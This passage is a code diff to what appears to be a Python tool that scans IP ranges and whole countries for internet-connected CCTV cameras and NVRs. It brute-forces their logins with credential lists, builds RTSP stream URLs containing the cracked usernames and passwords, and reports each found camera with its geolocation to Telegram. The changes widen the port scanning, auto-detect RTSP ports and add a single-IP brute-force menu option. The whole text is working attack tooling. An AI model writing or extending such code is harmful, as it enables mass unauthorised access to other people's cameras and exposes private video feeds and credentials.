@@ -4853,12 +4853,26 @@ def fast_port_scan(ip: str,
                     pass
         return None
 
-    with ThreadPoolExecutor(max_workers=len(ports)) as executor:
-        results = executor.map(check_port, ports)
-        for port in results:
-            if port:
-                open_ports.append(port)
-                if port in [80, 443, 37777]:
+    # Cap inner pool to 8 threads: 300 outer workers × 26 ports × uncapped = ~7800
+    # threads simultaneously, which exceeds the OS limit and causes RuntimeError.
+    # 8 threads per call × 300 outer workers = 2400 max concurrent port-scan threads,
+    # well within the safe range.
+    _ps_workers = min(len(ports), 8)
+    try:
+        with ThreadPoolExecutor(max_workers=_ps_workers) as executor:
+            results = executor.map(check_port, ports)
+            for port in results:
+                if port:
+                    open_ports.append(port)
+                    if port in [80, 443, 37777]:
+                        break
+    except RuntimeError:
+        # OS thread limit hit — fall back to sequential scan
+        for _p in ports:
+            _r = check_port(_p)
+            if _r:
+                open_ports.append(_r)
+                if _r in [80, 443, 37777]:
                     break
 
     return open_ports
@@ -5195,8 +5209,8 @@ def detect_camera_type(ip: str, port: int = 80) -> Tuple[bool, str, int]:
     Returns:
         Tuple of (detected: bool, camera_type: str, port: int)
     """
-    # Skip detection if port 37777 (definitely Dahua)
-    if port == 37777:
+    # Skip detection if port is a Dahua SDK port (definitely Dahua)
+    if port in (37777, 37778, 37779):
         return True, "Anjhua-Dahua Technology Camera", port
 
     # Quick port-based detection (no HTTP request needed for speed)
@@ -5621,8 +5635,9 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 37777, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085]
+            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
+                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
+                                           8888, 9000, 37777, 37778, 37779]
         ]
         if not camera_ports:
             return None
@@ -5638,7 +5653,7 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
                     break
 
         if not camera_found:
-            if detected_port == 37777:
+            if detected_port in (37777, 37778, 37779):
                 camera_type = "Anjhua-Dahua Technology Camera"
                 camera_found = True
 
@@ -5725,8 +5740,9 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 37777, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085]
+            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
+                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
+                                           8888, 9000, 37777, 37778, 37779]
         ]
 
         if not camera_ports:
@@ -5799,11 +5815,11 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
 
             # Now try credentials
             # Determine if we should try Dahua first based on port or detected type
-            # Detect Dahua by camera_type label, port 37777, or HTTP probe so cameras
-            # on port 80/8000/8080 with Dahua firmware are not misrouted to Hikvision validator
+            # Detect Dahua by camera_type label, SDK ports 37777/37778/37779, or HTTP probe
             is_dahua = (
                 (camera_type and ("Dahua" in camera_type or "Anjhua" in camera_type))
-                or detected_port == 37777
+                or detected_port in (37777, 37778, 37779)
+                or any(p in open_ports for p in (37777, 37778, 37779))
                 or _probe_dahua_by_http(ip, detected_port, timeout=1.0)
             )
 
@@ -5896,8 +5912,21 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                         # Send to Telegram if enabled
                         if TELEGRAM_CONFIG["enabled"] and TELEGRAM_CONFIG["send_realtime"]:
                             model = device_models.get(ip, "")
-                            _rtsp_p = next((p for p in open_ports if p in [554, 8554]), None)
-                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p) if _rtsp_p else f"rtsp://{username}:{password}@{ip}:554{get_rtsp_paths(camera_type)[0]}"
+                            _RTSP_CANDS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+                            _rtsp_p = next((p for p in open_ports if p in _RTSP_CANDS), None)
+                            if not _rtsp_p:
+                                for _cp in _RTSP_CANDS:
+                                    try:
+                                        _ts2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        _ts2.settimeout(0.4)
+                                        if _ts2.connect_ex((ip, _cp)) == 0:
+                                            _rtsp_p = _cp
+                                            _ts2.close()
+                                            break
+                                        _ts2.close()
+                                    except Exception:
+                                        pass
+                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p or 554)
                             geo = get_geographic_location(ip)
                             msg = f"✅ <b>Camera Found!</b>\n"
                             msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -6004,8 +6033,21 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                         # Send to Telegram if enabled
                         if TELEGRAM_CONFIG["enabled"] and TELEGRAM_CONFIG["send_realtime"]:
                             model = device_models.get(ip, "")
-                            _rtsp_p = next((p for p in open_ports if p in [554, 8554]), None)
-                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p) if _rtsp_p else f"rtsp://{username}:{password}@{ip}:554{get_rtsp_paths(camera_type)[0]}"
+                            _RTSP_CANDS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+                            _rtsp_p = next((p for p in open_ports if p in _RTSP_CANDS), None)
+                            if not _rtsp_p:
+                                for _cp in _RTSP_CANDS:
+                                    try:
+                                        _ts2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        _ts2.settimeout(0.4)
+                                        if _ts2.connect_ex((ip, _cp)) == 0:
+                                            _rtsp_p = _cp
+                                            _ts2.close()
+                                            break
+                                        _ts2.close()
+                                    except Exception:
+                                        pass
+                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p or 554)
                             geo = get_geographic_location(ip)
                             msg = f"✅ <b>Camera Found!</b>\n"
                             msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -6111,8 +6153,21 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                         # Send to Telegram if enabled
                         if TELEGRAM_CONFIG["enabled"] and TELEGRAM_CONFIG["send_realtime"]:
                             model = device_models.get(ip, "")
-                            _rtsp_p = next((p for p in open_ports if p in [554, 8554]), None)
-                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p) if _rtsp_p else f"rtsp://{username}:{password}@{ip}:554{get_rtsp_paths(camera_type)[0]}"
+                            _RTSP_CANDS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+                            _rtsp_p = next((p for p in open_ports if p in _RTSP_CANDS), None)
+                            if not _rtsp_p:
+                                for _cp in _RTSP_CANDS:
+                                    try:
+                                        _ts2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        _ts2.settimeout(0.4)
+                                        if _ts2.connect_ex((ip, _cp)) == 0:
+                                            _rtsp_p = _cp
+                                            _ts2.close()
+                                            break
+                                        _ts2.close()
+                                    except Exception:
+                                        pass
+                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p or 554)
                             geo = get_geographic_location(ip)
                             msg = f"✅ <b>Camera Found!</b>\n"
                             msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -6200,8 +6255,21 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                                           camera_type, open_ports)
                         if TELEGRAM_CONFIG["enabled"] and TELEGRAM_CONFIG["send_realtime"]:
                             model = device_models.get(ip, "")
-                            _rtsp_p = next((p for p in open_ports if p in [554, 8554]), None)
-                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p) if _rtsp_p else f"rtsp://{username}:{password}@{ip}:554{get_rtsp_paths(camera_type)[0]}"
+                            _RTSP_CANDS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+                            _rtsp_p = next((p for p in open_ports if p in _RTSP_CANDS), None)
+                            if not _rtsp_p:
+                                for _cp in _RTSP_CANDS:
+                                    try:
+                                        _ts2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        _ts2.settimeout(0.4)
+                                        if _ts2.connect_ex((ip, _cp)) == 0:
+                                            _rtsp_p = _cp
+                                            _ts2.close()
+                                            break
+                                        _ts2.close()
+                                    except Exception:
+                                        pass
+                            rtsp_url = find_working_rtsp_url(ip, username, password, camera_type, _rtsp_p or 554)
                             geo = get_geographic_location(ip)
                             msg = f"✅ <b>Camera Found!</b>\n"
                             msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -6275,8 +6343,9 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]],
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 37777, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085]
+            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
+                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
+                                           8888, 9000, 37777, 37778, 37779]
         ]
 
         if not camera_ports:
@@ -6286,10 +6355,10 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]],
             return None
 
         detected_port = camera_ports[0]
-        # Check Dahua by port 37777 (SDK port) OR by probing HTTP response content
-        # so cameras on port 80/8000/8080 are also correctly identified as Dahua
-        is_dahua = (detected_port == 37777 or
-                    _probe_dahua_by_http(ip, detected_port, timeout=1.0))
+        # Check Dahua by SDK ports 37777/37778/37779 OR by probing HTTP response content
+        is_dahua = (detected_port in (37777, 37778, 37779)
+                    or any(p in open_ports for p in (37777, 37778, 37779))
+                    or _probe_dahua_by_http(ip, detected_port, timeout=1.0))
 
         print(
             f"{Fore.CYAN}[*] [{current}/{total}] {ip}: port {detected_port} — trying login...{Style.RESET_ALL}",
@@ -6425,9 +6494,12 @@ def calculate_optimal_workers(mode: str = 'scan') -> int:
         else:
             w = 20
 
-    # Safety cap: leave room for existing threads (Telegram worker, bot listener, etc.)
+    # Safety cap: each scan worker spawns up to 8 port-scan sub-threads, so the
+    # effective thread multiplier is ~9×.  Keep total ≤ 900 → outer cap ≤ 900÷9 = 100.
+    # Also subtract already-active threads so long-running scans stay safe.
     active_threads = _t.active_count()
-    safe_budget = max(10, 900 - active_threads)  # never exceed ~900 total
+    # budget = (900 - active_threads) / 9  → rounded down, minimum 10
+    safe_budget = max(10, (900 - active_threads) // 9)
     w = min(w, safe_budget)
 
     print(f"{Fore.CYAN}[*] Auto-threads: {w} ({mode}) | Cores: {cpu_cores} | Free RAM: {ram_gb:.1f} GB | Active threads: {active_threads}{Style.RESET_ALL}")
@@ -6463,7 +6535,7 @@ def scan_ip_range(start_ip: str,
         print(f"{Fore.RED}[!] Invalid IP range!{Style.RESET_ALL}")
         return
 
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 554, 8080, 8000, 37777]  # 37777=Dahua SDK, 8000=Hikvision SDK, 554=RTSP
+    ports_to_scan = _cli_port_override if _cli_port_override else [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]  # expanded port list
 
     if max_workers is None:
         max_workers = calculate_optimal_workers('scan')
@@ -6487,10 +6559,15 @@ def scan_ip_range(start_ip: str,
     start_scan_dashboard(15)
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_ip = {
-            executor.submit(scan_single_ip, ip, credentials, ports_to_scan): ip
-            for ip in unique_ips
-        }
+        future_to_ip = {}
+        for ip in unique_ips:
+            for _retry in range(5):
+                try:
+                    future_to_ip[executor.submit(scan_single_ip, ip, credentials, ports_to_scan)] = ip
+                    break
+                except RuntimeError:
+                    time.sleep(2 ** _retry * 0.5)
+            # silently skip the IP if all retries failed (OS still thread-starved)
 
         for future in as_completed(future_to_ip):
             ip = future_to_ip[future]
@@ -6929,7 +7006,7 @@ def scan_country_cameras(country: dict,
         return
 
     total_ips = ip_count
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 554, 8080, 8000, 37777]  # 37777=Dahua SDK, 8000=Hikvision SDK, 554=RTSP
+    ports_to_scan = _cli_port_override if _cli_port_override else [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]  # expanded port list
 
     if max_workers is None:
         max_workers = calculate_optimal_workers('scan')
@@ -7075,7 +7152,12 @@ def scan_country_cameras(country: dict,
                         with results_lock:
                             scanned_count += 1
                         continue
-                    future_to_ip[executor.submit(scan_single_ip_with_detection, ip, credentials, ports_to_scan, country['name'], country['code'])] = ip
+                    for _sr in range(5):
+                        try:
+                            future_to_ip[executor.submit(scan_single_ip_with_detection, ip, credentials, ports_to_scan, country['name'], country['code'])] = ip
+                            break
+                        except RuntimeError:
+                            time.sleep(2 ** _sr * 0.5)
                     seen_range_ips.add(ip)
 
             for future in as_completed(future_to_ip):
@@ -8167,10 +8249,10 @@ def brute_force_from_file(file_path: str,
         except Exception:
             pass
 
-        # Detect Dahua by label, port 37777, or HTTP probe — catches cameras on port 80/8000
+        # Detect Dahua by label, SDK ports 37777/37778/37779, or HTTP probe
         is_dahua = (
             "Dahua" in camera_type or "Anjhua" in camera_type
-            or port == 37777
+            or port in (37777, 37778, 37779)
             or _probe_dahua_by_http(ip, port, timeout=1.0)
         )
 
@@ -8763,7 +8845,7 @@ def scan_country_cameras_detection_only(country: dict,
         return
 
     total_ips = ip_count
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 554, 8080, 8000, 37777]  # 37777=Dahua SDK, 8000=Hikvision SDK, 554=RTSP
+    ports_to_scan = _cli_port_override if _cli_port_override else [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888, 9000, 10554, 34567, 37777, 37778, 37779]  # expanded port list
 
     if max_workers is None:
         max_workers = calculate_optimal_workers('scan')
@@ -9220,7 +9302,7 @@ def print_feature_help():
         ("--scan-only",        "Skip login check after IP scan — collect cameras first"),
         ("--brute-only FILE",  "Skip menu — run login check on a saved camera file"),
         ("--threads N",        "Force thread count (1-500), overrides adaptive mode"),
-        ("--port PORT",        "Scan a single port only instead of [80,8080,8000,37777]"),
+        ("--port PORT",        "Scan a single port only instead of the expanded default list"),
         ("--timeout N",        "Socket timeout in seconds (default 0.15). Higher=slower/more accurate"),
         ("--output PATH",      "Write cameras to custom path instead of XX_CCTV_Found.txt"),
         ("--credentials FILE", "Load user:pass pairs from custom file instead of built-in list"),
@@ -9378,7 +9460,7 @@ def print_feature_help():
     with _remote_thread_override_lock:
         _cur_thr = _remote_thread_override
     _thr_str  = f"{_cur_thr} (forced)" if _cur_thr > 0 else "adaptive"
-    _port_str = str(_cli_port_override[0]) if _cli_port_override else "80, 8080, 8000, 37777 (default)"
+    _port_str = str(_cli_port_override[0]) if _cli_port_override else "80,443,554,1024..37779 (26 ports)"
     _sp = load_scan_progress()
     _bp = load_brute_progress()
     if _sp:
@@ -10576,24 +10658,45 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
 
     _channels = []
 
+    # ── RTSP candidate ports (in priority order) ──────────────────────────────
+    _RTSP_CANDIDATE_PORTS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+
     # ── TCP pre-check ─────────────────────────────────────────────────────────
-    _tcp_ok_http = _tcp_ok_554 = False
-    for _pc in ([80, nvr_port, 554] if nvr_port not in (80, 554) else [80, 554]):
+    _tcp_ok_http = False
+    _rtsp_port   = None          # will hold the first open RTSP port found
+
+    # Check HTTP port(s) first
+    for _pc in ([nvr_port] if nvr_port in (80, 8080, 8000) else [80, nvr_port]):
         try:
             _ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             _ts.settimeout(0.5)
             _ts.connect((nvr_ip, _pc))
             _ts.close()
-            if _pc == 554:
-                _tcp_ok_554 = True
-            else:
-                _tcp_ok_http = True
+            _tcp_ok_http = True
+            break
         except Exception:
             pass
 
-    if not _tcp_ok_http and not _tcp_ok_554:
+    # Probe all candidate RTSP ports — use first that accepts a TCP connection
+    for _rp in _RTSP_CANDIDATE_PORTS:
+        try:
+            _ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            _ts.settimeout(0.5)
+            _ts.connect((nvr_ip, _rp))
+            _ts.close()
+            _rtsp_port = _rp
+            break
+        except Exception:
+            pass
+
+    _tcp_ok_rtsp = (_rtsp_port is not None)
+
+    if not silent and _tcp_ok_rtsp and _rtsp_port != 554:
+        print(f"  {Y}[RTSP] Port 554 closed — using alternate RTSP port {_rtsp_port}{W}")
+
+    if not _tcp_ok_http and not _tcp_ok_rtsp:
         if not silent:
-            print(f"  {R}[!] {nvr_ip} unreachable (ports {nvr_port} & 554 closed).{W}")
+            print(f"  {R}[!] {nvr_ip} unreachable (HTTP & all RTSP ports closed).{W}")
         return 0, None
 
     def _soap(endpoint, body, _t=3.0):
@@ -10652,7 +10755,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 _channels.append({
                     'num':      _i + 1,
                     'name':     _chname,
-                    'rtsp':     _rtsp or f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/Streaming/Channels/{(_i+1)*100+1}",
+                    'rtsp':     _rtsp or f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port or 554}/Streaming/Channels/{(_i+1)*100+1}",
                     'snapshot': f"http://{nvr_ip}:{nvr_port}/onvif/snapshot?token={_tok}",
                     'source':   'ONVIF',
                 })
@@ -10679,7 +10782,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                         _channels.append({
                             'num':      int(_cid),
                             'name':     _cn,
-                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/Streaming/Channels/{_cid}01",
+                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port or 554}/Streaming/Channels/{_cid}01",
                             'snapshot': f"http://{nvr_ip}:{nvr_port}/ISAPI/Streaming/channels/{_cid}01/picture",
                             'source':   'Hikvision',
                         })
@@ -10703,7 +10806,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                     _channels.append({
                         'num':      _ci,
                         'name':     f"Channel {_ci}",
-                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/cam/realmonitor?channel={_ci}&subtype=0",
+                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port or 554}/cam/realmonitor?channel={_ci}&subtype=0",
                         'snapshot': f"http://{nvr_ip}:{nvr_port}/cgi-bin/snapshot.cgi?channel={_ci}",
                         'source':   'Dahua',
                     })
@@ -10728,7 +10831,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                     _channels.append({
                         'num':      _ci,
                         'name':     f"Channel {_ci}",
-                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/media/video{_ci}",
+                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port or 554}/media/video{_ci}",
                         'snapshot': f"http://{nvr_ip}:{nvr_port}/webapi/snap?channel={_ci}",
                         'source':   'Uniview',
                     })
@@ -10753,7 +10856,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                         _channels.append({
                             'num':      _i + 1,
                             'name':     _uri.split('/')[-1],
-                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_uri}",
+                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port or 554}{_uri}",
                             'snapshot': f"http://{nvr_ip}:{nvr_port}/axis-cgi/jpg/image.cgi?resolution=640x480",
                             'source':   'Axis',
                         })
@@ -10761,9 +10864,9 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
             pass
 
     # ── Generic RTSP DESCRIBE probe ───────────────────────────────────────────
-    if not _channels and _tcp_ok_554:
+    if not _channels and _tcp_ok_rtsp:
         if not silent:
-            print(f"  {Y}[Generic] Probing channels 1-32 via RTSP DESCRIBE...{W}")
+            print(f"  {Y}[Generic] Probing channels 1-32 via RTSP DESCRIBE (port {_rtsp_port})...{W}")
         _g_tpls = [
             '/Streaming/Channels/{n}01',
             '/h264/ch{n}/main/av_stream',
@@ -10777,14 +10880,14 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 if _found_ch:
                     break
                 _gpath = _gt.replace('{n}', str(_gn))
-                _gurl  = f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_gpath}"
+                _gurl  = f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port}{_gpath}"
                 _greq  = (f"DESCRIBE {_gurl} RTSP/1.0\r\nCSeq: 1\r\n"
                           f"User-Agent: SMVScanner\r\n\r\n")
                 for _retry in range(2):
                     try:
                         _gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         _gs.settimeout(_timeout if not _retry else _timeout * 0.7)
-                        _gs.connect((nvr_ip, 554))
+                        _gs.connect((nvr_ip, _rtsp_port))
                         _gs.sendall(_greq.encode())
                         _gresp = _gs.recv(128).decode('utf-8', errors='replace')
                         _gs.close()
@@ -10939,7 +11042,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
         ],
     }
 
-    if _tcp_ok_554:
+    if _tcp_ok_rtsp:
         # Build probe list: detected brand first, then all remaining brands
         _src_key = (_real_source if _channels else 'Generic')
         _seen_paths = set()
@@ -10950,7 +11053,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 if _path not in _seen_paths:
                     _seen_paths.add(_path)
                     _zc_probes.append((
-                        f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_path}",
+                        f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:{_rtsp_port}{_path}",
                         _lbl,
                         f"http://{nvr_ip}:{nvr_port}{_snap}",
                     ))
@@ -10965,7 +11068,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
             try:
                 _zs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 _zs.settimeout(1.0)
-                _zs.connect((nvr_ip, 554))
+                _zs.connect((nvr_ip, _rtsp_port))
                 _zs.sendall((f"DESCRIBE {_zurl} RTSP/1.0\r\nCSeq: 1\r\n"
                              f"User-Agent: SMVScanner\r\n\r\n").encode())
                 _zresp = _zs.recv(256).decode('utf-8', errors='replace')
@@ -10996,11 +11099,11 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                         _channels[0]['source'])
 
     # ── Verify credentials via first non-ZeroChannel RTSP DESCRIBE ───────────────
-    if _test_rtsp:
+    if _test_rtsp and _tcp_ok_rtsp:
         try:
             _vs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             _vs.settimeout(1.5)
-            _vs.connect((nvr_ip, 554))
+            _vs.connect((nvr_ip, _rtsp_port))
             _verify_rtsp = next((c['rtsp'] for c in _channels if not c.get('zero_ch')),
                                 _channels[0]['rtsp'])
             _vreq = (f"DESCRIBE {_verify_rtsp} RTSP/1.0\r\nCSeq: 1\r\n"
@@ -11010,7 +11113,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
             _vs.close()
             if not silent:
                 if ' 200 ' in _vresp or ' 401 ' in _vresp:
-                    print(f"  {G}[✓] Credentials verified (RTSP reachable){W}")
+                    print(f"  {G}[✓] Credentials verified (RTSP reachable on port {_rtsp_port}){W}")
                 else:
                     print(f"  {Y}[!] RTSP connection OK but authentication unclear{W}")
         except Exception as _ve:
@@ -11018,12 +11121,12 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 print(f"  {R}[!] Could not verify: {_ve}{W}")
 
     # ── Live-test all channels and store result in _ch['live'] ───────────────
-    # Skip entirely if port 554 is already known to be closed — avoids
-    # stalling for (n_channels × 1.5 s) when RTSP is unreachable.
+    # Skip entirely if no RTSP port is reachable — avoids stalling for
+    # (n_channels × 1.5 s) when RTSP is unreachable on all candidate ports.
     _tested_ok = 0
-    if _test_rtsp and not _tcp_ok_554:
+    if _test_rtsp and not _tcp_ok_rtsp:
         if not silent:
-            print(f"  {Y}[!] Port 554 closed — skipping per-channel RTSP live-test.{W}")
+            print(f"  {Y}[!] No RTSP port reachable — skipping per-channel live-test.{W}")
         for _ch in _channels:
             _ch['live'] = '?'
     else:
@@ -11033,7 +11136,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 try:
                     _cts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     _cts.settimeout(1.5)
-                    _cts.connect((nvr_ip, 554))
+                    _cts.connect((nvr_ip, _rtsp_port))
                     _cts.sendall((f"DESCRIBE {_ch['rtsp']} RTSP/1.0\r\nCSeq: 1\r\n"
                                   f"User-Agent: SMV\r\n\r\n").encode())
                     _cr = _cts.recv(256).decode('utf-8', errors='replace')
@@ -11058,9 +11161,11 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
         _real_ch_count = sum(1 for c in _channels if not c.get('zero_ch'))
         _zc_entry      = next((c for c in _channels if c.get('zero_ch')), None)
         print(f"\n{C}{'═'*70}{W}")
+        _rtsp_lbl = f"RTSP Port : {_rtsp_port}" if _tcp_ok_rtsp else "RTSP : N/A"
         print(f"{G}  NVR Channel Map  —  {nvr_ip}:{nvr_port}  "
               f"({_real_ch_count} channel(s) via {_real_source}"
               f"{' + ZeroChannel' if _zc_entry else ''}){W}")
+        print(f"  {C}{_rtsp_lbl}{W}")
         print(f"  {Y}Username : {nvr_user}  │  Password : {nvr_pass}{W}")
         print(f"  {Y}Location : {_geo_str}{W}")
         print(f"  {Y}Country  : {_geo.get('country','Unknown')}  |  "
@@ -11960,9 +12065,23 @@ def _launch_auto_test(ip: str, port: int, username: str, password: str,
                       camera_type: str = '', open_ports: list = None,
                       country_code: str = 'XX') -> None:
     """Start auto_test_camera in a daemon thread (non-blocking)."""
-    _rtsp_p = 554
+    _RTSP_CANDS = [554, 8554, 10554, 1024, 5554, 7554, 34567, 37778, 37779]
+    _rtsp_p = None
     if open_ports:
-        _rtsp_p = next((p for p in open_ports if p in [554, 8554]), 554)
+        _rtsp_p = next((p for p in open_ports if p in _RTSP_CANDS), None)
+    if not _rtsp_p:
+        for _cp in _RTSP_CANDS:
+            try:
+                _ts3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                _ts3.settimeout(0.4)
+                if _ts3.connect_ex((ip, _cp)) == 0:
+                    _rtsp_p = _cp
+                    _ts3.close()
+                    break
+                _ts3.close()
+            except Exception:
+                pass
+    _rtsp_p = _rtsp_p or 554
     _t = threading.Thread(
         target=auto_test_camera,
         args=(ip, port, username, password, camera_type, _rtsp_p, country_code),
@@ -14224,10 +14343,11 @@ def tools_submenu() -> None:
         print(f"{Y}27.{W} Scan Mood Indicator")
         print(f"{Y}28.{W} Normal User Traffic Simulation (test)")
         print(f"{Y}29.{W} Preferred Admin Account Settings")
+        print(f"{Y}30.{W} Single IP Brute Force  (RTSP port auto-detected)")
         print(f"{Y} b.{W} Back to Main Menu")
         print(f"{C}{'═'*58}{W}")
         try:
-            sub = input(f"{G}Choose (1-29 or b): {W}").strip()
+            sub = input(f"{G}Choose (1-30 or b): {W}").strip()
         except (EOFError, KeyboardInterrupt):
             break
 
@@ -15194,6 +15314,157 @@ def tools_submenu() -> None:
             if _tools_wait_back():
                 continue
 
+        # ── 30. Single IP Brute Force (RTSP port auto-detected) ───────────────
+        elif sub == '30':
+            C30, G30, Y30, W30, R30 = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
+            print(f"\n{C30}{'─'*60}{W30}")
+            print(f"{G30}  Single IP Brute Force{W30}")
+            print(f"{C30}{'─'*60}{W30}")
+            print(f"  Target a specific IP — ports are scanned, RTSP port is")
+            print(f"  auto-detected, then all credentials are tried in sequence.\n")
+            try:
+                _sb_ip = input(f"{G30}Target IP (or 'b' to back): {W30}").strip()
+                if _sb_ip.lower() in ('b', 'back', ''):
+                    continue
+                _sb_port_in = input(f"{G30}HTTP port [80] (or 'b' to back): {W30}").strip()
+                if _sb_port_in.lower() in ('b', 'back'):
+                    continue
+                _sb_port = int(_sb_port_in or 80)
+            except (EOFError, KeyboardInterrupt, ValueError):
+                continue
+
+            # ── Step 1: Full port scan ─────────────────────────────────────────
+            print(f"\n{C30}[1/4] Port scan — {_sb_ip} ...{W30}", end='', flush=True)
+            _sb_all_ports = [80, 443, 554, 1024, 1025, 1050, 3000, 5554, 7554, 8000,
+                             8080, 8081, 8082, 8083, 8084, 8085, 8200, 8443, 8554, 8888,
+                             9000, 10554, 34567, 37777, 37778, 37779]
+            _sb_open = fast_port_scan(_sb_ip, _sb_all_ports, timeout=1.0)
+            print(f" {G30}done{W30}")
+            if _sb_open:
+                print(f"  Open ports : {G30}{', '.join(str(p) for p in _sb_open)}{W30}")
+            else:
+                print(f"  {Y30}[!] No ports open on {_sb_ip} — aborting.{W30}")
+                if _tools_wait_back():
+                    continue
+                continue
+
+            # Override HTTP port if a better one was discovered
+            _sb_cam_ports = [p for p in _sb_open if p in [80, 443, 1025, 1050, 3000,
+                                                           8000, 8080, 8081, 8082, 8083,
+                                                           8084, 8085, 8200, 8443, 8888,
